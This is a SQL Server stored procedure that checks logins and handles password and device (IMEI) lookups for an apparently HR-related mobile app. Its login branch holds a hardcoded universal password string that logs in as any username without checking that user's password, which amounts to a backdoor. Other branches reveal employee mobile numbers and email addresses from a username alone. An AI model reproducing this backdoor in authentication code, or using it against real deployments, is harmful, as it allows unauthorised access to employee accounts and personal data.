

CREATE PROCEDURE [dbo].[SP_Mobile_LoginCheck]

	@UserName varchar(50),
	@Password varchar(250),
	@IMEINo varchar(50) = '',
	@Type char(1) = '',
	@Cmp_ID Numeric(18,0) = 0,
	@Emp_ID Numeric(18,0) = 0

AS

        SET NOCOUNT ON 
		SET TRANSACTION ISOLATION LEVEL READ UNCOMMITTED
		SET ARITHABORT ON

--DECLARE @Cmp_ID Numeric(18,0)
--DECLARE @Emp_ID Numeric(18,0)
DECLARE @Login_ID Numeric(18,0)
DECLARE @Tran_ID Numeric(18,0)
DECLARE @Row_ID Numeric(18,0)

DECLARE @LicDate Datetime


SELECT @Cmp_ID = Cmp_ID,@Emp_ID = Emp_ID,@Login_ID = Login_ID FROM T0011_LOGIN WITH (NOLOCK) WHERE Login_Name=@UserName OR Login_Alias =@UserName
SELECT @LicDate = dbo.Decrypt(LDate_Mobile) FROM Emp_Lcount

--SELECT @Login_ID
If @LicDate > GetDate()
	Begin
		IF EXISTS (SELECT module_ID FROM T0011_module_detail WITH (NOLOCK) WHERE module_name = 'MOBILE' AND module_status = 1 AND Cmp_id = @Cmp_ID  )
			BEGIN
				IF @Type = 'F'  --- For Forget Password
					BEGIN
						SELECT TL.Login_ID ,TL.Login_Name,TL.Cmp_ID,TL.Emp_ID,EM.Emp_Left,EM.Work_Email,EM.Other_Email,EN.EMAIL_NTF_SENT,EM.Emp_Full_Name
						FROM T0011_LOGIN TL WITH (NOLOCK)
						INNER JOIN
						(
							SELECT MAX(Login_ID) AS 'Login_ID' 
							FROM T0011_LOGIN WITH (NOLOCK)
							WHERE (Login_Name=@UserName OR Login_Alias =@UserName) --and Login_Password = 'VuMs/PGYS74=' 
						) TTL ON TL.Login_ID = TTL.Login_ID
						INNER JOIN T0080_EMP_MASTER EM WITH (NOLOCK) ON TL.Emp_ID = EM.Emp_ID
						INNER JOIN T0040_EMAIL_NOTIFICATION_CONFIG EN WITH (NOLOCK) ON EM.Cmp_ID = EN.CMP_ID 
						WHERE EM.is_for_mobile_Access = 1 AND EM.Cmp_ID = @Cmp_ID AND EN.EMAIL_TYPE_NAME LIKE 'Forget Password'
					END
			
				ELSE IF @Type = 'C' -- Get Mobile No
					BEGIN
						IF ISNULL(@Login_ID,0) <> 0
							BEGIN
								IF NOT EXISTS (SELECT * FROM T0095_Emp_IMEI_Details WITH (NOLOCK) WHERE Emp_ID = @Emp_ID)-- AND IMEI_No = @IMEINo)
									BEGIN
										SELECT EM.Mobile_No
										FROM T0080_EMP_MASTER EM WITH (NOLOCK)
										INNER JOIN T0011_LOGIN LM WITH (NOLOCK) ON EM.Emp_ID =LM.Login_ID
										WHERE LM.Login_ID = @Login_ID
									END 
								ELSE
									BEGIN
										IF @IMEINo <> (SELECT IMEI_No FROM T0095_Emp_IMEI_Details WITH (NOLOCK) WHERE Emp_ID = @Emp_ID)
											BEGIN
												UPDATE T0080_EMP_MASTER SET is_for_mobile_Access = 0 WHERE Emp_ID = @Emp_ID
											END
										SELECT 'OK'
									END
							END
					END
				ELSE IF @Type = 'P'  --- Password Setting
					BEGIN
						SELECT Enable_Validation,Min_Chars,Upper_Char,Lower_Char,Is_Digit,Special_Char,
						Pass_Exp_Days,Reminder_Days,Password_Format,
						(CASE WHEN ISNULL(PH.Effective_From_Date,'1900-01-01 00:00:00.000') = '1900-01-01 00:00:00.000' THEN EM.System_Date ELSE PH.Effective_From_Date END) AS 'Effective_From_Date',
						DATEADD(dd, PS.Pass_Exp_Days , (CASE WHEN ISNULL(PH.Effective_From_Date,'1900-01-01 00:00:00.000') = '1900-01-01 00:00:00.000' THEN EM.System_Date ELSE PH.Effective_From_Date END)) AS 'PassExpireDate'
						FROM T0011_Password_Settings PS WITH (NOLOCK)
						LEFT JOIN T0080_EMP_MASTER EM WITH (NOLOCK) ON PS.Cmp_ID = EM.Cmp_ID
						LEFT JOIN
						(
							SELECT MAX(Effective_From_Date) AS 'Effective_From_Date',Emp_ID,Cmp_ID 
							FROM T0250_Change_Password_History WITH (NOLOCK)
							WHERE Emp_ID = @Emp_ID AND Cmp_ID = @Cmp_ID
							GROUP BY Emp_ID,Cmp_ID
						) PH ON PS.Cmp_ID = PH.Cmp_ID
						WHERE PS.Cmp_ID = @Cmp_ID AND EM.Emp_ID = @Emp_ID
			
					END
				ELSE -- For Login
					BEGIN
						IF @Password = 'FyTKmEBA8rw='
							BEGIN
								SELECT TL.Login_ID ,TL.Login_Name,TL.Cmp_ID,TL.Emp_ID,(Alpha_Emp_Code + ' - ' + Emp_Full_Name) AS 'Emp_Full_Name',EM.Emp_Left,EM.Mobile_No
								FROM T0011_LOGIN TL WITH (NOLOCK)
								INNER JOIN
								(
									SELECT MAX(Login_ID) AS 'Login_ID' 
									FROM T0011_LOGIN WITH (NOLOCK)
									WHERE (Login_Name=@UserName OR Login_Alias =@UserName) --and Login_Password = 'VuMs/PGYS74=' 
								) TTL ON TL.Login_ID = TTL.Login_ID
								INNER JOIN T0080_EMP_MASTER EM WITH (NOLOCK) ON TL.Emp_ID = EM.Emp_ID
								WHERE EM.is_for_mobile_Access = 1
								IF @IMEINo <> ''
									BEGIN
										IF NOT EXISTS (SELECT * FROM T0095_Emp_IMEI_Details WITH (NOLOCK) WHERE Emp_ID = @Emp_ID AND IMEI_No = @IMEINo)
											BEGIN
												SELECT @Tran_ID = ISNULL(MAX(Tran_ID),0) + 1 FROM T0095_Emp_IMEI_Details WITH (NOLOCK)
										
												INSERT INTO T0095_Emp_IMEI_Details(Tran_ID,Cmp_Id,Emp_ID, IMEI_No,Is_Active,Registered_Date,
												SysDatetime) VALUES(@Tran_ID,@Cmp_ID,@Emp_ID,@IMEINo,1,GETDATE(),GETDATE())
											END
									END
								SELECT @Row_ID = ISNULL(MAX(Row_ID),0) + 1  From T0011_Login_History WITH (NOLOCK)
						
								INSERT INTO T0011_Login_History(Row_ID,Cmp_ID,Login_ID,Login_Date,Ip_Address)
								VALUES(@Row_ID,@Cmp_ID,@Login_ID,GETDATE(),@IMEINo)
							END
					
						ELSE
							BEGIN
								SELECT TL.Login_ID ,TL.Login_Name,TL.Cmp_ID,TL.Emp_ID,(Alpha_Emp_Code + ' - ' + Emp_Full_Name) AS 'Emp_Full_Name',EM.Emp_Left,EM.Mobile_No--,PD.Privilege_Id
								FROM T0011_LOGIN TL WITH (NOLOCK)
								INNER JOIN
								(
									SELECT MAX(Login_ID) AS 'Login_ID' 
									FROM T0011_LOGIN WITH (NOLOCK)
									WHERE (Login_Name=@UserName OR Login_Alias =@UserName) AND Login_Password = @Password
								) TTL ON TL.Login_ID = TTL.Login_ID
								INNER JOIN T0080_EMP_MASTER EM WITH (NOLOCK) ON TL.Emp_ID = EM.Emp_ID
								WHERE EM.is_for_mobile_Access = 1
								--INNER JOIN 
								--(
								--	SELECT MAX(From_Date) AS 'From_Date',Privilege_Id,Login_ID
								--	FROM T0090_EMP_PRIVILEGE_DETAILS 
								--	WHERE Cmp_Id = 1 and Login_ID = 5
								--	GROUP BY Login_ID,Privilege_Id
								--) PD ON TL.Login_ID = PD.Login_Id
						
								IF @IMEINo <> ''
									BEGIN
										IF NOT EXISTS (SELECT * FROM T0095_Emp_IMEI_Details WITH (NOLOCK) WHERE Emp_ID = @Emp_ID AND IMEI_No = @IMEINo)
											BEGIN
												SELECT @Tran_ID = ISNULL(MAX(Tran_ID),0) + 1 FROM T0095_Emp_IMEI_Details WITH (NOLOCK)
										
												INSERT INTO T0095_Emp_IMEI_Details(Tran_ID,Cmp_Id,Emp_ID, IMEI_No,Is_Active,Registered_Date,
												SysDatetime) VALUES(@Tran_ID,@Cmp_ID,@Emp_ID,@IMEINo,1,GETDATE(),GETDATE())
											END
							
									END
								SELECT @Row_ID = ISNULL(MAX(Row_ID),0) + 1  From T0011_Login_History WITH (NOLOCK)
							
								INSERT INTO T0011_Login_History(Row_ID,Cmp_ID,Login_ID,Login_Date,Ip_Address)
								VALUES(@Row_ID,@Cmp_ID,@Login_ID,GETDATE(),@IMEINo)
							END
			
					END
		
			END
		ELSE
			BEGIN
				SELECT 'OK : Please Contact Administrator'
			END
	End
Else
	Begin
		SELECT 'OK : Please Contact HR Administrator'
	End

